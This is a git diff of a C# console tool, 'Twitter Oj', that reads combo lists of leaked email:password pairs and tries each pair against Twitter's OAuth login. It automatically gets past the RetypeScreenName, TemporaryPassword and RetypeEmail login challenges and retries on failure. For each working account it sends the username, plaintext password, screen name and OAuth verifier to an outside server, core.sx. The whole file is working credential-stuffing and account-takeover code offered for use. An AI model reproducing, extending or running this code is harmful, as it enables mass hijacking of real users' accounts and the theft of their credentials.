@@ -2,143 +2,325 @@ using System;
 using RestSharp;
 using System.Net;
 using System.IO;
+using Colorful;
+using Console = Colorful.Console;
+using System.Drawing;
+using System.Linq;
 
-namespace Corecode_Twitter
+namespace Twitter_Oj
 {
     class Program
     {
-        public static int total_done = 0;
-        public static int valid_done = 0;
+        public static int doneTotal = 0;
+        public static int doneAdded = 0;
         static void Main(string[] args)
         {
 
-            //Console.Write("Combo List Path: ");
-            string combolist = @"C:\Users\Matthew\Desktop\Serverpact Cracked.txt"/*Console.ReadLine()*/;
+            Console.Title = "Twitter Oj | by Matthew";
 
 
+            //#> Provide some information
+            Console.Write("combo list path: ");
+            Console.ForegroundColor = Color.White;
+            string combolist = Console.ReadLine();
+
+            Console.ForegroundColor = Color.DarkGray;
+            Console.Write("username_or_email split: ");
+            Console.ForegroundColor = Color.White;
+            int u_split = ushort.Parse(Console.ReadLine());
+
+            Console.ForegroundColor = Color.DarkGray;
+            Console.Write("password split: ");
+            Console.ForegroundColor = Color.White;
+            int p_split = ushort.Parse(Console.ReadLine());
+
+            //#> Create a StreamReader
             StreamReader ImportFile = new StreamReader(combolist);
-            string line;
 
+            string line;
             while ((line = ImportFile.ReadLine()) != null)
             {
-                total_done++;
-                string[] Account = line.Split('|');
-                string username_or_email = Account.Length >= 2 ? Account[1] : null;
-                string password = /*Account.Length >= 5 ?*/ Account[4] /*: null*/;
+                //#> Create a string of the user information and make sure it does not give a exception
+                doneTotal++;
+                string[] Account = line.Split(':');
+                string username_or_email = Account.Length >= u_split+1 ? Account[u_split] : null;
+                string password = Account.Length >= p_split+1 ? Account[p_split] : null;
 
-                Console.WriteLine(addTwitter(username_or_email, password.ToLower()));
+                //#> Create new Twitter
+                Twitter(username_or_email, password.ToLower());
             }
-            Console.WriteLine(String.Format("[LAST=DONE] Done: {0}, added {1}", total_done.ToString(), valid_done.ToString()));
+
+            //#> Done with all accounts
+            Formatter[] Format = new Formatter[] { new Formatter(doneTotal, Color.White), new Formatter(doneAdded, Color.White), };
+            Console.WriteLineFormatted("[Done/{0}] {1} out of {0} added.", Color.DarkGray, Format);
             Console.ReadLine();
+
         }
 
-        private static string addTwitter(string username_or_email, string password)
+        private static string Twitter(string username_or_email, string password)
         {
-            
-            WebClient coreSX = new WebClient();
-            string oauth_token = coreSX.DownloadString("http://core.sx/Twitter/requestUrl.php");
+            //#> Some basic information
+            Console.Title = String.Format("Twitter Oj | by Matthew | Tested: {0} | Added: {1}", doneTotal, doneAdded);
+            string bypassTemp = String.Empty;
+            string login_name = String.Empty;
+            string screen_name = String.Empty;
 
-            CookieContainer Cookies = new CookieContainer();
-            RestClient Twitter = new RestClient("https://api.twitter.com");
+            Twitter:
+            try {
 
-            RestRequest new_authenticity_token = new RestRequest("/oauth/authorize?oauth_token=" + oauth_token);
-            var post_values = Twitter.Get(new_authenticity_token);
-            string authenticity_token = getBetween(post_values.Content, "name=\"authenticity_token\" type=\"hidden\" value=\"", "\">");
+                //#> Create a RestClient & CookieContainer
+                CookieContainer Cookies = new CookieContainer();
+                RestClient Request = new RestClient("https://core.sx");
 
-            foreach (var cookie in post_values.Cookies)
-            {
-                Cookies.Add(new Cookie(cookie.Name, cookie.Value, cookie.Path, cookie.Domain));
-            }
-            Twitter.CookieContainer = Cookies;
+                //#> Request the oauth_token from the API
+                request_oauth_token:
+                try {
 
-            loginAgain:
-            RestRequest oauth_authorize = new RestRequest("/oauth/authorize", Method.POST);
-            oauth_authorize.AddParameter("authenticity_token", authenticity_token);
-            oauth_authorize.AddParameter("redirect_after_login", "https://api.twitter.com/oauth/authorize?oauth_token=" + oauth_token);
-            oauth_authorize.AddParameter("oauth_token", oauth_token);
-            oauth_authorize.AddParameter("session[username_or_email]", username_or_email);
-            oauth_authorize.AddParameter("session[password]", password);
-            var verifier_oauth = Twitter.Post(oauth_authorize);
+                    Request.BaseUrl = new Uri("https://core.sx");
+                    var requestUrl = Request.Get(new RestRequest("/Twitter/requestUrl.php"));
+                    string oauth_token = requestUrl.Content;
 
-            string account_information = String.Format("[{2}={3}] {0}: ", username_or_email, new string('*', password.Length), authenticity_token, oauth_token);
+                    //#> Request a authenticity_token from Twitter for auth
+                    Request.BaseUrl = new Uri("https://api.twitter.com");
+                    var requestToken = Request.Get(new RestRequest(String.Format("/oauth/authorize?oauth_token={0}", oauth_token)));
+                    string authenticity_token = getBetween(requestToken.Content, "name=\"authenticity_token\" type=\"hidden\" value=\"", "\">");
 
-            if (verifier_oauth.Content.Contains("https://support.twitter.com/articles/63510"))
-            {
-                return account_information + "Your IP is currently locked for 1 hour. Please change your IP and press a key to proceed";
-                //Console.ReadLine();
-            }
+                    //#> Add the Twitter cookies to the client
+                    foreach (var Cookie in requestToken.Cookies)
+                    {
+                        Cookies.Add(new Cookie(Cookie.Name, Cookie.Value, Cookie.Path, Cookie.Domain));
+                    }
+                    Request.CookieContainer = Cookies;
 
-            else if (verifier_oauth.Content.Contains("login-challenge-form"))
-            {
-                string challenge_type = getBetween(verifier_oauth.Content, "name=\"challenge_type\" value=\"", "\"/>");
+                    //#> Login to the account
+                    login:
 
-                if (challenge_type == "RetypeScreenName")
-                {
+                    if(String.IsNullOrEmpty(bypassTemp))
+                    {
+                        login_name = username_or_email;
+                    }
+                    else
+                    {
+                        login_name = bypassTemp;
+                    }
 
-                    string user_id = getBetween(verifier_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
-                    string second_authenticity_token = getBetween(verifier_oauth.Content, "name=\"authenticity_token\" value=\"", "\"/>");
-                    string challenge_id = getBetween(verifier_oauth.Content, "name=\"challenge_id\" value=\"", "\"/>");
-                    string redirect_after_login = getBetween(verifier_oauth.Content, "name=\"redirect_after_login\" value=\"", "\"/>");
+                    RestRequest oauth_authorize = new RestRequest("/oauth/authorize", Method.POST);
+                    oauth_authorize.AddParameter("authenticity_token", authenticity_token);
+                    oauth_authorize.AddParameter("redirect_after_login", String.Format("https://api.twitter.com/oauth/authorize?oauth_token={0}", oauth_token));
+                    oauth_authorize.AddParameter("oauth_token", oauth_token);
+                    oauth_authorize.AddParameter("session[username_or_email]", login_name);
+                    oauth_authorize.AddParameter("session[password]", password);
+                    var valid_oauth = Request.Post(oauth_authorize);
 
-                    string hack_user_id = coreSX.DownloadString("https://twitter.com/intent/user?user_id=" + user_id);
-                    string screen_name = getBetween(hack_user_id, "<span class='tweet-full-name'>@", "</span>");
+                    var short_authenticity_token = authenticity_token != null ? string.Join("", authenticity_token.Take(13)) : null;
+                    var short_oauth_token = oauth_token != null ? string.Join("", oauth_token.Take(13)) : null;
+                    string account_information = String.Format("[{1}/{2}] ", "", short_authenticity_token, short_oauth_token);
 
-                    RestRequest RetypeScreenName_challenge = new RestRequest("/account/login_challenge", Method.POST);
-                    RetypeScreenName_challenge.AddParameter("authenticity_token", second_authenticity_token);
-                    RetypeScreenName_challenge.AddParameter("challenge_id", challenge_id);
-                    RetypeScreenName_challenge.AddParameter("user_id", user_id);
-                    RetypeScreenName_challenge.AddParameter("challenge_type", "RetypeScreenName");
-                    RetypeScreenName_challenge.AddParameter("platform", "web");
-                    RetypeScreenName_challenge.AddParameter("redirect_after_login", redirect_after_login);
-                    RetypeScreenName_challenge.AddParameter("remember_me", "true");
-                    RetypeScreenName_challenge.AddParameter("challenge_response", screen_name);
-                    var unlocked_account = Twitter.Post(RetypeScreenName_challenge);
+                    //#> If the account is locked
+                    if (valid_oauth.Content.Contains("login-challenge-form"))
+                    {
+                        //#> Grab some basic information needed
+                        string challenge_type = getBetween(valid_oauth.Content, "name=\"challenge_type\" value=\"", "\"/>");
+                        string user_id = getBetween(valid_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
+                        string second_authenticity_token = getBetween(valid_oauth.Content, "name=\"authenticity_token\" value=\"", "\"/>");
+                        string challenge_id = getBetween(valid_oauth.Content, "name=\"challenge_id\" value=\"", "\"/>");
+                        string redirect_after_login = getBetween(valid_oauth.Content, "name=\"redirect_after_login\" value=\"", "\"/>");
 
-                    Console.WriteLine(account_information + "login-challenge-form bypassed");
-                    goto loginAgain;
+                        //#> Bypass challenge RetypeScreenName
+                        if (challenge_type == "RetypeScreenName")
+                        {
+                            RetypeScreenName:
+                            try
+                            {
+                                //#> Get the screenname with user_id
+                                Request.BaseUrl = new Uri("https://twitter.com");
+                                var requestUsername = Request.Get(new RestRequest(String.Format("/intent/user?user_id={0}", user_id)));
+                                
+
+                                //#> Make sure the account is not suspended
+                                if (requestUsername.ResponseUri.ToString() != "https://mobile.twitter.com/account/suspended")
+                                {
+                                    screen_name = getBetween(requestUsername.Content, "<span class=\"nickname\">@", "</span>");
+
+                                    //#> Unlock the account
+                                    Request.BaseUrl = new Uri("https://api.twitter.com");
+                                    RestRequest RetypeScreenName = new RestRequest("/account/login_challenge", Method.POST);
+                                    RetypeScreenName.AddParameter("challenge_type", "RetypeScreenName");
+                                    RetypeScreenName.AddParameter("platform", "web");
+                                    RetypeScreenName.AddParameter("remember_me", "true");
+
+                                    RetypeScreenName.AddParameter("authenticity_token", second_authenticity_token);
+                                    RetypeScreenName.AddParameter("challenge_id", challenge_id);
+                                    RetypeScreenName.AddParameter("user_id", user_id);
+                                    RetypeScreenName.AddParameter("redirect_after_login", redirect_after_login);
+                                    RetypeScreenName.AddParameter("challenge_response", screen_name);
+                                    var unlocked_account = Request.Post(RetypeScreenName);
+
+                                    //Console.WriteLine(String.Format("screen_name: {0}, user_id: {1},", screen_name, user_id));
+
+
+                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("RetypeScreenName", Color.Orange), };
+                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);
+
+                                    goto login;
+                                }
+                                else
+                                {
+                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Suspended account", Color.Red), };
+                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1})", Color.DarkGray, Format);
+                                }
+                            }
+                            catch
+                            {
+                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Twitter", Color.LightBlue), };
+                                Console.WriteLineFormatted(account_information + "{0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
+                                goto RetypeScreenName;
+                            }
+
+                        }
+
+                        //#> Bypass challenge TemporaryPassword
+                        else if (challenge_type == "TemporaryPassword")
+                        {
+                            TemporaryPassword:
+                            try
+                            {
+                                //#> Get the screenname with user_id
+                                Request.BaseUrl = new Uri("https://twitter.com");
+                                var requestUsername = Request.Get(new RestRequest(String.Format("/intent/user?user_id={0}", user_id)));
+                                bypassTemp = getBetween(requestUsername.Content, "<span class=\"nickname\">@", "</span>");
+
+                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("TemporaryPassword", Color.Orange), };
+                                Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);
+
+                                goto login;
+                            }
+                            catch
+                            {
+                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Twitter", Color.LightBlue), };
+                                Console.WriteLineFormatted(account_information + "{0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
+                                goto TemporaryPassword;
+                            }
+                        }
+
+                        //#> Bypass challenge RetypeEmail
+                        else if (challenge_type == "RetypeEmail")
+                        {
+                            RetypeEmail:
+                            try
+                            {
+                                //#> Unlock the account
+                                Request.BaseUrl = new Uri("https://api.twitter.com");
+                                RestRequest RetypeEmail = new RestRequest("/account/login_challenge", Method.POST);
+                                RetypeEmail.AddParameter("challenge_type", "RetypeEmail");
+                                RetypeEmail.AddParameter("platform", "web");
+                                RetypeEmail.AddParameter("remember_me", "true");
+
+                                RetypeEmail.AddParameter("authenticity_token", second_authenticity_token);
+                                RetypeEmail.AddParameter("challenge_id", challenge_id);
+                                RetypeEmail.AddParameter("user_id", user_id);
+                                RetypeEmail.AddParameter("redirect_after_login", redirect_after_login);
+                                RetypeEmail.AddParameter("challenge_response", username_or_email);
+                                var unlocked_account = Request.Post(RetypeEmail);
+
+                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("RetypeEmail", Color.Orange), };
+                                Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);
+
+                                goto login;
+                            }
+                            catch
+                            {
+                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Twitter", Color.LightBlue), };
+                                Console.WriteLineFormatted(account_information + "{0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
+                                goto RetypeEmail;
+                            }
+                        }
+
+                        //#> Other challenge
+                        else
+                        {
+                            Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter(challenge_type, Color.Red), };
+                            Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): not bypassable", Color.DarkGray, Format);
+                        }
+
+                    }
+
+                    //#> If the account is locked
+                    else if (valid_oauth.Content.Contains("account_identifier"))
+                    {
+                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("account_identifier", Color.Orange), };
+                        Console.WriteLineFormatted(account_information + "{0}: Locked account ({1})", Color.DarkGray, Format);
+                    }
+
+                    //#> If the account information is not correct
+                    else if (valid_oauth.Content.Contains("<div class=\"message\">"))
+                    {
+                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Incorrect password", Color.Red), };
+                        Console.WriteLineFormatted(account_information + "{0}: {1}", Color.DarkGray, Format);
+                    }
+
+                    //#> If the request provides a 404, means locked or idk yet
+                    else if (valid_oauth.Content.Contains("<title>Twitter / ?</title>"))
+                    {
+                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Core", Color.Gold), };
+                        Console.WriteLineFormatted("[Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
+                    }
+
+                    //#> If the account is all valid
+                    else if (valid_oauth.Content.Contains("Twitter/requestUrl.php?oauth"))
+                    {
+                        try
+                        {
+                            doneAdded++;
+                            string oauth_verifier = getBetween(valid_oauth.Content, "Twitter/requestUrl.php?", "\"/>");
+
+                            //#> Get the screen name
+                            if (String.IsNullOrEmpty(screen_name))
+                            {
+                                Request.BaseUrl = new Uri("https://mobile.twitter.com");
+                                var account_info = Request.Get(new RestRequest("/account"));
+                                screen_name = getBetween(account_info.Content, "class=\"screen-name\">", "</span>");
+                            }
+
+                            //#> Save the account
+                            Request.BaseUrl = new Uri("https://core.sx");
+                            var safeToken = Request.Get(new RestRequest(String.Format("/Twitter/requestUrl.php?{0}&login={1}:{2}:{3}", oauth_verifier, username_or_email, password, screen_name)));
+
+                            Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Added account", Color.Green), new Formatter(screen_name, Color.White), };
+                            Console.WriteLineFormatted(account_information + "{0}: {1} ({2})", Color.DarkGray, Format);
+                        }
+                        catch
+                        {
+
+                        }
+                    }
+
+                    //#> If the account is suspended
+                    else
+                    {
+                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Suspended account", Color.Red), };
+                        Console.WriteLineFormatted("[Error/requestUrl] {0}: {1}", Color.DarkGray, Format);
+                    }
 
                 }
-                else if(challenge_type == "TemporaryPassword")
+                catch
                 {
-                    string user_id = getBetween(verifier_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
-                    string hack_user_id = coreSX.DownloadString("https://twitter.com/intent/user?user_id=" + user_id);
-                    string screen_name = getBetween(hack_user_id, "<span class='tweet-full-name'>@", "</span>");
-
-
-                    return "";
-
-                }
-                else
-                {
-                    return account_information + String.Format("login-challenge-form ({0})", challenge_type);
+                    //#> requestUrl API is down, retry
+                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Core", Color.Gold), };
+                    Console.WriteLineFormatted("[Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
+                    goto request_oauth_token;
                 }
 
             }
-
-            else if (verifier_oauth.Content.Contains("account_identifier"))
-                return account_information + "Account locked (account_identifier)";
-
-            else if (verifier_oauth.Content.Contains("<div class=\"message\">"))
-                return account_information + "Incorrect password";
-
-            else if (verifier_oauth.Content.Contains("<title>Twitter / ?</title>"))
-                return account_information + "Incorrect password";
-
-
-            else if (verifier_oauth.Content.Contains("Twitter/requestUrl.php?oauth"))
+            catch
             {
-                valid_done++;
-                string requestUrl = getBetween(verifier_oauth.Content, "Twitter/requestUrl.php?", "\"/>");
-                string addAccount = coreSX.DownloadString(String.Format("http://core.sx/Twitter/requestUrl.php?{0}&login={1}:{2}", requestUrl, username_or_email, password));
+                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), };
+                Console.WriteLineFormatted("[Error/Unknown] {0}: Unknown Error while checking account, retrying", Color.DarkGray, Format);
+                goto Twitter;
+            }
 
-                return account_information + addAccount;
-            }
-            else
-            {
-                Console.WriteLine(verifier_oauth.Content);
-                Console.ReadLine();
-                return account_information + "Idk what happend? Lol.";
-            }
+            //#> return a empty string
+            return String.Empty;
         }
 
         private static string getBetween(string strSource, string strStart, string strEnd)
@@ -155,5 +337,6 @@ namespace Corecode_Twitter
                 return "";
             }
         }
+
     }
 }
